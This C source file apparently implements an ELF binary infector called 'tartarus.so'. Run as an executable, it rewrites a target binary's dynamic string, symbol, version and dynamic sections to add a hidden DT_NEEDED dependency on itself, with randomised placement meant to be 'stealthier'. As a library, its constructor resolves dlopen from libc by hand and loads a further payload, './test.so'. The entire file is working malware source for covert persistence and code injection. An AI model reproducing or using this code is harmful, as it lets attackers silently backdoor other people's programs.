#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <dlfcn.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <elf.h>
#include <stdint.h>
#include <errno.h>
#include <time.h>

#define lib "./test.so"
#define self "tartarus.so"
#define target "./tmp"
#define sub "exit"

const char interp[] __attribute__((section(".interp"))) = "/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2";

void entry() {
  // retrieve argc, argv, envp via initial stack layout (auxv region)
  unsigned long *frame;
  __asm__ volatile ("movq %%rbp, %0" : "=r" (frame)); // NOTE: can this be done with out inline asm??
  int argc = *(int *)(frame + 1);
  char **argv = (char **)(frame + 2);
  char **envp = argv + argc + 1;

  int envc = 0;
  while (envp[envc] != NULL) envc++;
  Elf64_auxv_t *auxv = (Elf64_auxv_t *)(envp + envc + 1); // NOTE: do we need auxv for anything??
  
  int fd = open(target, O_RDWR);
  void* base = mmap(NULL, 0x300000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0); // file backed shared memory mapping so changes reflect in file

  FILE* file = NULL;
  char* line = NULL;
  size_t len = 0;
  
  Elf64_Ehdr* ehdr = (Elf64_Ehdr*)base;
  unsigned int elf_size = ehdr->e_shoff + (ehdr->e_shentsize * ehdr->e_shnum);
  
  Elf64_Shdr* shdr = (Elf64_Shdr*)(base + ehdr->e_shoff);
  
  Elf64_Shdr* shstrtab = (Elf64_Shdr*)(((ehdr->e_shstrndx * ehdr->e_shentsize) + ehdr->e_shoff) + base);
  
  char* dyn_str = NULL;
  
  char* strtab = (char*)(base + shstrtab->sh_offset);
  
  unsigned int dynstr_size = 0;

  Elf64_Sym* dyn_sym = NULL;
  unsigned int sym_cnt = 0;
  
  Elf64_Dyn* dynamic = NULL;
  unsigned int dyn_cnt = 0;
  
  int flag = 0;

  Elf64_Half* versym = NULL;
  
  // find needed sections
  for(int i = 0; i < ehdr->e_shnum && (dyn_str == NULL || dynamic == NULL); ++i){
    if(shdr->sh_type == SHT_GNU_versym){
      versym = (Elf64_Half*)((char*)ehdr + shdr->sh_offset);
    }else if(shdr->sh_type == SHT_DYNSYM && !strcmp(&strtab[shdr->sh_name], ".dynsym")){
      dyn_sym = (Elf64_Sym*)((char*)ehdr + shdr->sh_offset);
      sym_cnt = shdr->sh_size / sizeof(Elf64_Sym);
    }else if(shdr->sh_type == SHT_STRTAB && !strcmp(&strtab[shdr->sh_name], ".dynstr")){
      dyn_str = (char*)ehdr + shdr->sh_offset;
      dynstr_size = shdr->sh_size;
    }else if(shdr->sh_type == SHT_DYNAMIC && !strcmp(&strtab[shdr->sh_name], ".dynamic")){
      dynamic = (Elf64_Dyn*)((char*)ehdr + shdr->sh_offset);
      dyn_cnt = shdr->sh_size / sizeof(Elf64_Dyn);
      if(shdr[1].sh_offset - shdr->sh_offset >= sizeof(Elf64_Dyn)){
        flag = 1;
      }
    }
    shdr++;
  }

  const char *candidates[] = {
    "_ITM_deregisterTMCloneTable",
    "__gmon_start__",
    "_ITM_registerTMCloneTable",
    NULL
  };

  char* str = NULL;
  int candidate_found = 0;

  for (int c = 0; candidates[c] != NULL && !candidate_found; c++) {
    str = dyn_str + 1;
    while ((str - dyn_str) < dynstr_size) {
      if (!strcmp(str, candidates[c])) {
        candidate_found = 1;
        strcpy(str, sub); // insert substituted symbol name
        // now sub will show up in .dynsym instead of soname
        strcpy(&str[strlen(sub)+1], self);
        // find dynsym entry and patch to match a normal global symbol
        for(unsigned int i = 0; i < sym_cnt; ++i){
          if(dyn_sym[i].st_name == (str - dyn_str)){
            dyn_sym[i].st_info = STB_GLOBAL << 4 | STT_FUNC;
            dyn_sym[i].st_other = STV_DEFAULT;

            // get libc base address from maps
            unsigned long long libc_base = 0;
            int libc_fd = 0;
            file = fopen("/proc/self/maps", "r");
            while(1){
              getline(&line, &len, file);
              if(strstr(line, "libc") != NULL){
                int offset = strcspn(line, "-");
                line[offset++] = '\0';
                libc_base = strtoull(line, NULL, 16);
                line[strcspn(&line[offset], "\n") + offset] = '\0';
                libc_fd = open(strstr(&line[offset], "/"), O_RDONLY);
                break;
              }
            }
            fclose(file);

            void* libc = mmap(NULL, 0x300000, PROT_READ, MAP_PRIVATE, libc_fd, 0);
            close(libc_fd);

            // parse libc elf headers
            Elf64_Ehdr* libc_ehdr = (Elf64_Ehdr*)libc;
            Elf64_Shdr* libc_shdr = (Elf64_Shdr*)(libc + libc_ehdr->e_shoff);
            Elf64_Shdr* libc_shstrtab = (Elf64_Shdr*)(((libc_ehdr->e_shstrndx * libc_ehdr->e_shentsize) + libc_ehdr->e_shoff) + libc);

            char* libc_strtab = (char*)(libc + libc_shstrtab->sh_offset);

            Elf64_Half* libc_versym = NULL;
            Elf64_Sym* libc_dynsym = NULL;
            int libc_sym_cnt = 0;
            char* libc_dynstr = NULL;

            // find needed sections in libc
            for(int j = 0; j < libc_ehdr->e_shnum; ++j){
              if(libc_shdr->sh_type == SHT_GNU_versym){
                libc_versym = (Elf64_Half*)((char*)libc_ehdr + libc_shdr->sh_offset);
                // TODO: do I explicitly need to do the strcmp for .dynsym?? tbd
              }else if(libc_shdr->sh_type == SHT_DYNSYM && !strcmp(&libc_strtab[libc_shdr->sh_name], ".dynsym")){
                libc_dynsym = (Elf64_Sym*)((char*)libc_ehdr + libc_shdr->sh_offset);
                libc_sym_cnt = libc_shdr->sh_size / sizeof(Elf64_Sym);
              }else if(libc_shdr->sh_type == SHT_STRTAB && !strcmp(&libc_strtab[libc_shdr->sh_name], ".dynstr")){
                libc_dynstr = (char*)libc_ehdr + libc_shdr->sh_offset;
              }
              libc_shdr++;
            }

            // find version index for 'sub' in libc
            unsigned int ver_ndx = VER_NDX_GLOBAL; //default: unversioned
            for(int j = 1; j < libc_sym_cnt; ++j){
              if(libc_dynsym[j].st_name != 0 && !strcmp(&libc_dynstr[libc_dynsym[j].st_name], sub)){
                // NOTE: VERSYM_HIDDEN should never be set for a chosen 'sub' symbol
                // NOTE: VER_NDX_GLOBAL should also never be set for a chosen 'sub'
                ver_ndx = libc_versym[j] & 0x7fff;
                break;
              }
            }

            // assign versym[i] the version index that corresponds to the version string that ver_ndx corresponds to in libc for 'sub'

            // find version string for ver_ndx in libc's verdef section
            char* ver_str = NULL;
            Elf64_Shdr* libc_shdr_iter = (Elf64_Shdr*)(libc + libc_ehdr->e_shoff);
            for(int j = 0; j < libc_ehdr->e_shnum; ++j){
              if(libc_shdr_iter->sh_type == SHT_GNU_verdef && libc_shdr_iter->sh_size > 0){
                Elf64_Verdef* vd = (Elf64_Verdef*)((char*)libc_ehdr + libc_shdr_iter->sh_offset);
                while(1){
                  if(vd->vd_ndx == ver_ndx){
                    // found the version definition, get the version string from the first auxiliary entry
                    Elf64_Verdaux* vda = (Elf64_Verdaux*)((char*)vd + vd->vd_aux);
                    // NOTE: ver_str is assumed will be found
                    ver_str = &libc_dynstr[vda->vda_name];
                    break;
                  }
                  if(vd->vd_next == 0) break;
                  vd = (Elf64_Verdef*)((char*)vd + vd->vd_next);
                }
                if(ver_str) break;
              }
              libc_shdr_iter++;
            }

            // find target's verneed section and look for the version string
            int found = 0;
            Elf64_Shdr* target_shdr_iter = (Elf64_Shdr*)(base + ehdr->e_shoff);
            for(int j = 0; j < ehdr->e_shnum; ++j){
              if(target_shdr_iter->sh_type == SHT_GNU_verneed && target_shdr_iter->sh_size > 0){
                Elf64_Verneed* vn = (Elf64_Verneed*)((char*)ehdr + target_shdr_iter->sh_offset);
                while(1){
                  // iterate through vernaux entries for this verneed
                  Elf64_Vernaux* vna = (Elf64_Vernaux*)((char*)vn + vn->vn_aux);
                  for(int k = 0; k < vn->vn_cnt; ++k){
                    if(!strcmp(&dyn_str[vna->vna_name], ver_str)){
                      // found the version string, use the version index from vna_other
                      versym[i] = vna->vna_other;
                      break;
                    }
                    if(vna->vna_next == 0) break;
                    vna = (Elf64_Vernaux*)((char*)vna + vna->vna_next);
                  }
                  if(found) break;
                  if(vn->vn_next == 0) break;
                  vn = (Elf64_Verneed*)((char*)vn + vn->vn_next);
                }
                break;
              }
              target_shdr_iter++;
            }

            munmap(libc, 0x300000);
            break;
          }
        }
        break;
      }
      str += strlen(str) + 1;
    }
  }

  // calculate offset for new dt_needed entry (random if more than 1 entry but bounded between first/last entry..stealthier??)
  int needed_offset = 0;
  for(int i = 0; ; ++i){
    if(dynamic[i].d_tag != DT_NEEDED){
      srand(time(0));
      needed_offset = i > 1 ? (rand() % (i - 1)) + 1 : 0;
      break;
    }
  }
  
  // for first needed entry use dynamic + 1, dynamic, dyn_cnt * sizeof(Elf64_Dyn) i.e. needed_offset = 0
  if(flag){
    // for shifting Dyn array down 1 to add new dt_needed field at the top instead of dt_debug->dt_needed
    memmove(dynamic + needed_offset + 1, dynamic + needed_offset, (dyn_cnt - needed_offset) * sizeof(Elf64_Dyn));
    dynamic[needed_offset].d_tag = DT_NEEDED;
    dynamic[needed_offset].d_un.d_val = &str[strlen(sub)+1] - dyn_str;
  }else{
    // loop through Dyn struct array to find dt_debug field converting dt_debug->dt_needed
    for(int i = 0; i < dyn_cnt; ++i){
      if(dynamic->d_tag == DT_DEBUG){
        dynamic->d_tag = DT_NEEDED;
        dynamic->d_un.d_val = &str[strlen(sub)+1] - dyn_str;
        break;
      }
      dynamic++;
    }
  }
  
  msync(base, 0x300000, MS_SYNC);
  munmap(base, 0x300000);
  
  close(fd);
  _exit(0);
}

void __attribute__((constructor)) foo(void){
  void* (*dl_open)(char*, int) = NULL;

  char *maps = "/proc/self/maps";

  FILE* file = fopen(maps, "r");
  
  char* line = NULL;
  size_t len = 0;

  unsigned long long libc_base = 0;

  int fd = 0;

  // read pid proc maps to get libc base addr and full abs path
  while(1){
    getline(&line, &len, file);
    if(strstr(line, "libc") != NULL){
      int offset = strcspn(line, "-");
      line[offset++] = '\0';
      libc_base = strtoull(line, NULL, 16);
      line[strcspn(&line[offset], "\n") + offset] = '\0';
      fd = open(strstr(&line[offset], "/"), O_RDONLY);
      break;
    }
  }

  fclose(file);
  
  void* libc = mmap(NULL, 0x300000, PROT_READ, MAP_PRIVATE, fd, 0);

  close(fd);
  
  Elf64_Ehdr* ehdr = (Elf64_Ehdr*)libc;

  Elf64_Shdr* shdr = (Elf64_Shdr*)(libc + ehdr->e_shoff);

  Elf64_Shdr* shstrtab = (Elf64_Shdr*)(((ehdr->e_shstrndx * ehdr->e_shentsize) + ehdr->e_shoff) + libc);
  
  Elf64_Sym* dyn_sym = NULL;
  
  int sym_cnt = 0;

  char* dyn_str = NULL;

  char* strtab = (char*)(libc + shstrtab->sh_offset);

  uint32_t* hashtab = NULL;

  // collect all sections needed for resolution of dynamic symbol locations in libc
  for(int i = 0; i < ehdr->e_shnum && (dyn_sym == NULL || dyn_str == NULL || hashtab == NULL); ++i){
    if(shdr->sh_type == SHT_DYNSYM && !strcmp(&strtab[shdr->sh_name], ".dynsym")){
      dyn_sym = (Elf64_Sym*)((char*)ehdr + shdr->sh_offset);
      sym_cnt = shdr->sh_size / sizeof(Elf64_Sym);
    }else if(shdr->sh_type == SHT_STRTAB && !strcmp(&strtab[shdr->sh_name], ".dynstr")){
      dyn_str = (char*)ehdr + shdr->sh_offset;
    }else if(shdr->sh_type == SHT_HASH && !strcmp(&strtab[shdr->sh_name], ".hash")){
      hashtab = (uint32_t*)((char*)ehdr + shdr->sh_offset);
    }
    shdr++;
  }

  // if hash table found (should always??) then look up symbols via hash table
  if(hashtab != NULL){
    char* sym_name = "dlopen";
    uint32_t hash = 0, tmp;

    // hash the symbol name
    for(int i = 0; sym_name[i]; ++i){
      hash = (hash << 4) + sym_name[i];
      if((tmp = hash & 0xf0000000)){
        hash ^= tmp | (tmp >> 24);
      }
    }

    uint32_t nbucket = hashtab[0];
    uint32_t* bucket = &hashtab[2];
    uint32_t* chain = &bucket[nbucket];

    //traverse the bucket chains to find symbol
    for(uint32_t i = bucket[hash % nbucket]; i; i = chain[i]){
      if(!strcmp(&dyn_str[dyn_sym[i].st_name], sym_name)){
        dl_open = (void* (*)(char*, int))(dyn_sym[i].st_value + libc_base);
        break;
      }
    }

  }

  // as fall back, allow linear symbol search
  if(dl_open == NULL){
    for(int i = 0; i < sym_cnt; ++i){
      if(dyn_sym->st_name != 0 && !strcmp(&dyn_str[dyn_sym->st_name], "dlopen")){
        dl_open = (void* (*)(char*, int))(dyn_sym->st_value + libc_base);
        break;
      }
      dyn_sym++;
    }
  }
  
  munmap(libc, 0x300000);
  
  // finally the fruits of labor, call the function
  dl_open(lib, RTLD_LAZY);
}
